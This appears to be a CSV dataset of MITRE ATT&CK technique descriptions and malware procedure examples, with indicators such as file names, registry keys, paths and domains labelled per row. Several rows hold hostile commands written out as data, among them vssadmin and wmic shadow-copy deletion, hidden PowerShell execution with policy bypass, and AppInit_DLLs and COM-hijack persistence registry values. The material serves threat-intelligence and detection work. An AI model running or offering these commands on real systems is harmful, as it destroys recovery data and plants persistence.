T1059.003,Windows Command Shell,Seasalt  uses cmd.exe to create a reverse shell on the infected endpoint.   [44],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,SILENTTRINITY  can use  cmd.exe  to enable lateral movement using DCOM.   [297],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Small Sieve  can use  cmd.exe  to execute commands on a victim's system.   [300],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Spark  can use cmd.exe to run commands.   [302],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Squirrelwaffle  has used  cmd.exe  for execution.   [303],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,STARWHALE  has the ability to execute commands via  cmd.exe .   [304],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,StrifeWater  can execute shell commands using  cmd.exe .   [306],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,TA505  has executed commands using  cmd.exe .   [309],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,TA551  has used  cmd.exe  to execute commands.   [310],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Taidoor  can copy cmd.exe into the system temp folder.   [311],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,TEXTMATE  executes cmd.exe to provide a reverse shell to adversaries.   [316]      [317],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Trojan.Karagany  can perform reconnaissance commands on a victim machine via a cmd.exe process.   [323],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Turla  RPC backdoors have used cmd.exe to execute commands.   [327]      [328],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,UPPERCUT  uses cmd.exe to execute commands on the victim’s machine.   [206],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,WarzoneRAT  can use  cmd.exe  to execute malicious code.   [335],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,WhisperGate  can use  cmd.exe  to execute commands.   [338],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Wizard Spider  has used cmd.exe to execute commands on a victim's machine.   [340],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Zebrocy  uses cmd.exe to execute commands on the system.   [342]      [343],Procedure Examples,file,cmd.exe
T1547.015,Login Items,"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.   [1]    Login items can be added via a shared file list or Service Management Framework.   [2]    Shared file list login items can be set using scripting languages such as  AppleScript , whereas the Service Management Framework uses the API call  SMLoginItemSetEnabled .   Login items installed using the Service Management Framework leverage  launchd , are not visible in the System Preferences, and can only be removed by the application that created them.   [2]      [3]    Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.   [4]    Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.   Adversaries can utilize  AppleScript  and  Native API  calls to create a login item to spawn malicious executables.   [5]    Prior to version 10.5 on macOS, adversaries can add login items by using  AppleScript  to send an Apple events to the ""System Events"" process, which has an AppleScript dictionary for manipulating login items.   [6]    Adversaries can use a command such as  tell application ""System Events"" to make login item at end with properties /path/to/executable .   [7]      [8]      [9]    This command adds the path of the malicious executable to the login item file list located in  ~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm .   [7]    Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.   [10]      [11]      [12]",Description,path,~/Library/Application Support/com.apple
T1218.012,Verclsid,"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.   [1]      Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running  verclsid.exe /S /C {CLSID} , where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to  Regsvr32 ). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.   [2]      [3]      [4]      [5]",Description,file,verclsid.exe
T1218.012,Verclsid,"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.   [1]      Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running  verclsid.exe /S /C {CLSID} , where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to  Regsvr32 ). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.   [2]      [3]      [4]      [5]",Description,file,Verclsid.exe
T1218.012,Verclsid,Hancitor  has used verclsid.exe to download and execute a malicious script.   [3],Procedure Examples,file,verclsid.exe
T1037.002,Login Hook,"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the  /Library/Preferences/com.apple.loginwindow.plist  file and can be modified using the  defaults  command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.   [1]      [2]       Adversaries can add or insert a path to a malicious script in the  com.apple.loginwindow.plist  file, using the  LoginHook  or  LogoutHook  key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.   [3]      [4]       Note:  Login hooks were deprecated in 10.11 version of macOS in favor of  Launch Daemon  and  Launch Agent",Description,path,/Library/Preferences/com.apple
T1564.003,Hidden Window,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.    On Windows, there are a variety of features in scripting languages in Windows, such as  PowerShell , Jscript, and  Visual Basic  to make windows hidden. One example of this is  powershell.exe -WindowStyle Hidden .    [1]      Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be  apple.awt.UIElement , which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.   Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.   [2]",Description,file,powershell.exe
T1564.003,Hidden Window,Koadic  has used the command  Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden  to hide its window.   [26],Procedure Examples,file,Powershell.exe
T1564.003,Hidden Window,PowerShower  has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.   [32],Procedure Examples,file,powershell.exe
T1564.003,Hidden Window,"QuasarRAT  can hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent string  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A  though  QuasarRAT  can only be run on Windows systems.   [33]",Procedure Examples,user-agent,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046"
T1036,Masquerading,"During  C0015 , the threat actors named a binary file  compareForfor.jpg  to disguise it as a JPG file.   [9]",Procedure Examples,file,compareForfor.jpg
T1036,Masquerading,PLATINUM  has renamed rar.exe to avoid detection.   [27],Procedure Examples,file,rar.exe
T1546.010,AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppInit_DLLs  value in the Registry keys  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows  or  HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows  are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.    [1]      Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.    [2]    Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.    The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.    [3]",Description,registry-key,HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows
T1546.010,AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppInit_DLLs  value in the Registry keys  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows  or  HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows  are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.    [1]      Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.    [2]    Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.    The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.    [3]",Description,registry-key,HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows
T1546.010,AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppInit_DLLs  value in the Registry keys  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows  or  HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows  are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.    [1]      Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.    [2]    Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.    The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.    [3]",Description,file,user32.dll
T1546.010,AppInit DLLs,"Some variants of  Cherry Picker  use AppInit_DLLs to achieve persistence by creating the following Registry key:  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows ""AppInit_DLLs""=""pserver32.dll""    [5]",Procedure Examples,file,pserver32.dll
T1546.010,AppInit DLLs,"If a victim meets certain criteria,  T9000  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys:  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll  and  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1 .   [7]",Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit
T1546.010,AppInit DLLs,"If a victim meets certain criteria,  T9000  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys:  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll  and  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1 .   [7]",Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit
T1546.010,AppInit DLLs,"If a victim meets certain criteria,  T9000  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys:  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll  and  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1 .   [7]",Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows
T1546.010,AppInit DLLs,"If a victim meets certain criteria,  T9000  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys:  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll  and  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1 .   [7]",Procedure Examples,file,ResN32.dll
T1218.001,Compiled HTML File,"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.    [1]    CHM content is displayed using underlying components of the Internet Explorer browser    [2]    loaded by the HTML Help executable program (hh.exe).    [3]      A custom CHM file containing embedded payloads could be delivered to a victim then triggered by  User Execution . CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.    [4]       [5]",Description,file,hh.exe
T1102,Web Service,Doki  has used the dogechain.info API to generate a C2 address.   [8],Procedure Examples,domain,dogechain.info
T1102,Web Service,"FIN8  has used  sslip.io , a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.   [14]",Procedure Examples,domain,sslip.io
T1102,Web Service,NETWIRE  has used web services including Paste.ee to host payloads.   [23],Procedure Examples,domain,paste.ee
T1102,Web Service,TeamTNT  has leveraged iplogger.org to send collected data back to C2.   [30]      [31],Procedure Examples,domain,iplogger.org
T1055.002,Portable Executable Injection,"Rocke 's miner, ""TermsHost.exe"", evaded defenses by injecting itself into Windows processes, including Notepad.exe.   [7]",Procedure Examples,file,TermsHost.exe
T1055.002,Portable Executable Injection,"Rocke 's miner, ""TermsHost.exe"", evaded defenses by injecting itself into Windows processes, including Notepad.exe.   [7]",Procedure Examples,file,Notepad.exe
T1055.011,Extra Window Memory Injection,Epic  has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.   [7],Procedure Examples,file,explorer.exe
T1055.011,Extra Window Memory Injection,Power Loader  overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.   [5]      [6],Procedure Examples,file,Explorer.exe
T1588.002,Tool,"HEXANE  has acquired, and sometimes customized, open source tools such as  Mimikatz ,  Empire , VNC remote access software, and DIG.net.   [51]      [52]      [53]",Procedure Examples,domain,dig.net
T1059.002,AppleScript,"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.   [1]    These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.   Scripts can be run from the command-line via  osascript /path/to/script  or  osascript -e ""script here"" . Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding  #!/usr/bin/osascript  to the start of the script file.   [2]      AppleScripts do not need to call  osascript  to execute. However, they may be executed from within mach-O binaries by using the macOS  Native API s  NSAppleScript  or  OSAScript , both of which execute code independent of the  /usr/bin/osascript  command line utility.   Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute  Native API s, which otherwise would require compilation and execution in a mach-O binary file format.   [3]    Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via  Python .   [4]",Description,domain,calendar.app
T1005,Data from Local System,"QakBot  can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.   [140]      [141]",Procedure Examples,file,esentutl.exe
T1546.015,Component Object Model Hijacking,ComRAT  samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location  HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32 .   [7],Procedure Examples,registry-key,HKCU\Software\Classes\CLSID
T1546.015,Component Object Model Hijacking,ComRAT  samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location  HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32 .   [7],Procedure Examples,file,shell32.dll
T1546.015,Component Object Model Hijacking,PcShare  has created the  HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32  Registry key for persistence.   [12],Procedure Examples,registry-key,HKCU\\Software\\Classes\\CLSID
T1546.015,Component Object Model Hijacking,WarzoneRAT   can perform COM hijacking by setting the path to itself to the  HKCU\Software\Classes\Folder\shell\open\command  key with a  DelegateExecute  parameter.   [14],Procedure Examples,registry-key,HKCU\Software\Classes\Folder\shell\open\command
T1016.001,Internet Connection Discovery,Gamaredon Group  has tested connectivity between a compromised machine and a C2 server using   Ping  with commands such as  CSIDL_SYSTEM\cmd.exe /c ping -n 1 .   [2],Procedure Examples,file,cmd.exe
T1016.001,Internet Connection Discovery,Neoichor  can check for Internet connectivity by contacting bing[.]com with the request format  bing[.]com?id=&lt;GetTickCount&gt; .   [5],Procedure Examples,domain,bing.com
T1016.001,Internet Connection Discovery,QuietSieve  can check C2 connectivity with a  ping  to 8.8.8.8 (Google public DNS).   [8],Procedure Examples,ip-address,8.8.8.8
T1647,Plist File Modification,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the  info.plist  file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.   [1]       Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e.  Hidden Window ) or running additional commands for persistence (ex:  Launch Agent / Launch Daemon  or  Re-opened Applications ).   For example, adversaries can add a malicious application path to the  ~/Library/Preferences/com.apple.dock.plist  file, which controls apps that appear in the Dock. Adversaries can also modify the  LSUIElement  key in an application’s  info.plist  file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as  LSEnvironment , to enable persistence via  Dynamic Linker Hijacking .   [2]      [3]",Description,path,~/Library/Preferences/com.apple
T1647,Plist File Modification,"XCSSET  uses the  plutil  command to modify the  LSUIElement ,  DFBundleDisplayName , and  CFBundleIdentifier  keys in the  /Contents/Info.plist  file to change how  XCSSET  is visible on the system.   [4]",Procedure Examples,path,/Contents/Info.plist
T1552.004,Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.   [1]    Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.    Adversaries may also look in common key directories, such as  ~/.ssh  for SSH keys on * nix-based systems or  C:\Users\(username)\.ssh\  on Windows. These private keys can be used to authenticate to  Remote Services  like SSH or for use in decrypting other collected files such as email.   Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.   [2]      [3]      Some private keys require a password or passphrase for operation, so an adversary may also use  Input Capture  for keylogging or attempt to  Brute Force  the passphrase off-line.",Description,path,C:\Users\(username).ssh
T1552.004,Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.   [1]    Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.    Adversaries may also look in common key directories, such as  ~/.ssh  for SSH keys on * nix-based systems or  C:\Users\(username)\.ssh\  on Windows. These private keys can be used to authenticate to  Remote Services  like SSH or for use in decrypting other collected files such as email.   Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.   [2]      [3]      Some private keys require a password or passphrase for operation, so an adversary may also use  Input Capture  for keylogging or attempt to  Brute Force  the passphrase off-line.",Description,path,~/.ssh
T1552.004,Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.   [1]    Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.    Adversaries may also look in common key directories, such as  ~/.ssh  for SSH keys on * nix-based systems or  C:\Users\(username)\.ssh\  on Windows. These private keys can be used to authenticate to  Remote Services  like SSH or for use in decrypting other collected files such as email.   Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.   [2]      [3]      Some private keys require a password or passphrase for operation, so an adversary may also use  Input Capture  for keylogging or attempt to  Brute Force  the passphrase off-line.",Description,path,C:\Users
T1518,Software Discovery,Mustang Panda  has searched the victim system for the  InstallUtil.exe  program and its version.   [20],Procedure Examples,file,InstallUtil.exe
T1518,Software Discovery,"During  Operation Dust Storm , the threat actors deployed a file called  DeployJava.js  to fingerprint installed software on a victim system prior to exploit delivery.   [21]",Procedure Examples,file,DeployJava.js
T1490,Inhibit System Recovery,Babuk  has the ability to delete shadow volumes using  vssadmin.exe delete shadows /all /quiet .   [5]      [6],Procedure Examples,file,vssadmin.exe
T1490,Inhibit System Recovery,BitPaymer  attempts to remove the backup shadow files from the host using  vssadmin.exe Delete Shadows /All /Quiet .   [7],Procedure Examples,file,vssadmin.exe
T1490,Inhibit System Recovery,DarkWatchman  can delete shadow volumes using  vssadmin.exe .   [11],Procedure Examples,file,vssadmin.exe
T1490,Inhibit System Recovery,MegaCortex  has deleted volume shadow copies using  vssadmin.exe .   [25],Procedure Examples,file,vssadmin.exe
T1490,Inhibit System Recovery,Meteor  can use  bcdedit  to delete different boot identifiers on a compromised host; it can also use  vssadmin.exe delete shadows /all /quiet  and  C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete .   [26],Procedure Examples,path,/all /quiet  and  C:\\Windows\\system32\\wbem\\wmic.exe
T1490,Inhibit System Recovery,Meteor  can use  bcdedit  to delete different boot identifiers on a compromised host; it can also use  vssadmin.exe delete shadows /all /quiet  and  C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete .   [26],Procedure Examples,file,vssadmin.exe
T1490,Inhibit System Recovery,Meteor  can use  bcdedit  to delete different boot identifiers on a compromised host; it can also use  vssadmin.exe delete shadows /all /quiet  and  C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete .   [26],Procedure Examples,file,wmic.exe
T1490,Inhibit System Recovery,Meteor  can use  bcdedit  to delete different boot identifiers on a compromised host; it can also use  vssadmin.exe delete shadows /all /quiet  and  C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete .   [26],Procedure Examples,path,C:\\Windows\\system32\\wbem\\wmic.exe
T1490,Inhibit System Recovery,ProLock  can use vssadmin.exe to remove volume shadow copies.   [29],Procedure Examples,file,vssadmin.exe
T1134.001,Token Impersonation or Theft,APT28  has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.   [1],Procedure Examples,cve,CVE-2015-1701
T1134.001,Token Impersonation or Theft,Aria-body  has the ability to duplicate a token from ntprint.exe.   [2],Procedure Examples,file,ntprint.exe
T1134.001,Token Impersonation or Theft,FIN8  has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.   [6],Procedure Examples,file,lsass.exe
T1134.001,Token Impersonation or Theft,FIN8  has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.   [6],Procedure Examples,file,vmtoolsd.exe
T1134.001,Token Impersonation or Theft,REvil  can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.   [11],Procedure Examples,file,explorer.exe
T1134.001,Token Impersonation or Theft,Siloscape  impersonates the main thread of  CExecSvc.exe  by calling  NtImpersonateThread .   [14],Procedure Examples,file,CExecSvc.exe
T1134.001,Token Impersonation or Theft,Tarrask  leverages token theft to obtain  lsass.exe  security permissions.   [16],Procedure Examples,file,lsass.exe
T1614.001,System Language Discovery,"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.   [1]      There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as  Query Registry  and calls to  Native API  functions.   [2]       For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language  or parsing the outputs of Windows API functions  GetUserDefaultUILanguage ,  GetSystemDefaultUILanguage ,  GetKeyboardLayoutList  and  GetUserDefaultLangID .   [3]      [4]      [5]      On a macOS or Linux system, adversaries may query  locale  to retrieve the value of the  $LANG  environment variable.",Description,registry-key,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language
T1614.001,System Language Discovery,"Ryuk  has been observed to query the registry key  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language  and the value  InstallLanguage . If the machine has the value 0x419 (Russian), 0x422 (Ukrainian), or 0x423 (Belarusian), it stops execution.   [2]",Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language
T1218.007,Msiexec,"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).   [1]    The Msiexec.exe binary may also be digitally signed by Microsoft.   Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.   [2]      [3]    Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the  AlwaysInstallElevated  policy is enabled.   [4]",Description,file,msiexec.exe
T1218.007,Msiexec,"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).   [1]    The Msiexec.exe binary may also be digitally signed by Microsoft.   Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.   [2]      [3]    Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the  AlwaysInstallElevated  policy is enabled.   [4]",Description,file,Msiexec.exe
T1218.007,Msiexec,Clop  can use msiexec.exe to disable security tools on the system.   [7],Procedure Examples,file,msiexec.exe
T1218.007,Msiexec,FlawedAmmyy  has been installed via  msiexec.exe .   [9],Procedure Examples,file,msiexec.exe
T1218.007,Msiexec,IcedID  can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application.    [11],Procedure Examples,file,msiexec.exe
T1218.007,Msiexec,Metamorfo  has used MsiExec.exe to automatically execute files.   [15]      [16],Procedure Examples,file,MsiExec.exe
T1218.007,Msiexec,Molerats  has used msiexec.exe to execute an MSI payload.   [17],Procedure Examples,file,msiexec.exe
T1218.007,Msiexec,QakBot  can use MSIExec to spawn multiple cmd.exe processes.   [18],Procedure Examples,file,cmd.exe
T1218.007,Msiexec,Ragnar Locker  has been delivered as an unsigned MSI package that was executed with  msiexec.exe .   [19],Procedure Examples,file,msiexec.exe
T1218.007,Msiexec,RCSession  has the ability to execute inside the msiexec.exe process.   [21],Procedure Examples,file,msiexec.exe
T1218.007,Msiexec,ZIRCONIUM  has used the msiexec.exe command-line utility to download and execute malicious MSI files.   [26],Procedure Examples,file,msiexec.exe
T1569.002,Service Execution,Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager ( services.exe ) is an interface to manage and manipulate services.   [1]    The service control manager is accessible to users via GUI components as well as system utilities such as  sc.exe  and  Net .    PsExec  can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.   [2]    Tools such as  PsExec  and  sc.exe  can accept remote servers as arguments and may be used to conduct remote execution.   Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with  Windows Service  during service persistence or privilege escalation.,Description,file,services.exe
T1569.002,Service Execution,Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager ( services.exe ) is an interface to manage and manipulate services.   [1]    The service control manager is accessible to users via GUI components as well as system utilities such as  sc.exe  and  Net .    PsExec  can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.   [2]    Tools such as  PsExec  and  sc.exe  can accept remote servers as arguments and may be used to conduct remote execution.   Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with  Windows Service  during service persistence or privilege escalation.,Description,file,sc.exe
T1569.002,Service Execution,APT41  used  svchost.exe and  Net  to execute a system service installed to launch a  Cobalt Strike  BEACON loader.   [9]      [10],Procedure Examples,file,svchost.exe
T1569.002,Service Execution,Bad Rabbit  drops a file named  infpub.dat into the Windows directory and is executed through SCManager and  rundll.exe .,Procedure Examples,file,rundll.exe
T1569.002,Service Execution,HOPLIGHT  has used svchost.exe to execute a malicious DLL .   [26],Procedure Examples,file,svchost.exe
T1569.002,Service Execution,Hydraq  uses svchost.exe to execute a malicious DLL included in a new service group.   [27],Procedure Examples,file,svchost.exe
T1569.002,Service Execution,Ragnar Locker  has used sc.exe to execute a service that it creates.   [48],Procedure Examples,file,sc.exe
T1569.002,Service Execution,WhisperGate  can download and execute AdvancedRun.exe via  sc.exe .   [59]      [60],Procedure Examples,file,AdvancedRun.exe
